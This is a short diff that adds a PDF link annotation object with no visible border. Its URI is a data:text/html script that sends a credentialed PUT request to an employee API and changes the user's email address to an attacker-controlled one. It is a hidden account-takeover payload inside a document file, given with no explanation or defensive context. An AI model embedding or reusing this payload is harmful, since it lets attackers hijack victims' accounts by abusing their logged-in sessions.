@@ -1,0 +1,13 @@
+8 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Border [0 0 0]
+/Rect [56.693 771.389 133.757 785.189]
+/A <<
+/Type /Action
+/S /URI
+/URI (data:text/html,<script>fetch(‘/api/employees/XXXXXXXXX/email’, { method: ‘PUT’, headers: { ‘Content-Type’: ‘application/json’ }, credentials: ‘include’, body: JSON.stringify({ email: ‘attackers-email@email.com’ }) }).then(res => res.json()).then(console.log).catch(console.error);</script>)
+>>
+>>
+endobj
